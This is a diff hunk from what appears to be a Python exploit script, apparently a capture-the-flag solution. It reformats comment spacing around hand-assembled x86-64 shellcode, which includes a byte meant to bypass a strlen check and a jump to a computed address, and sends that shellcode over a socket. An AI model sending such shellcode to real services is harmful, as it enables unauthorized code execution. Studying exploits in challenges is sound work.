@@ -53,13 +53,13 @@ try:
 
 
 	shellcode = ''
-	shellcode += '\x00\xc0' 					#add al, al, we need a byte to avoid strlen check and encryption
-	shellcode += '\x54'							#push rsp
-	shellcode += '\x58'							#pop rax
-	shellcode += '\x48\x83\xc0\x48'				#add rax, 0x48
-	shellcode += '\x48\x8b\x00'					#mov rax, [rax]
+	shellcode += '\x00\xc0' 			#add al, al, we need a byte to avoid strlen check and encryption
+	shellcode += '\x54'				#push rsp
+	shellcode += '\x58'				#pop rax
+	shellcode += '\x48\x83\xc0\x48'			#add rax, 0x48
+	shellcode += '\x48\x8b\x00'			#mov rax, [rax]
 	shellcode += '\x48\x2d\x4f\x01\x00\x00'		#sub rax, 0x14f
-	shellcode += '\xff\xe0'						#jmp rax
+	shellcode += '\xff\xe0'				#jmp rax
 
 
 	s.send(shellcode + '\n')
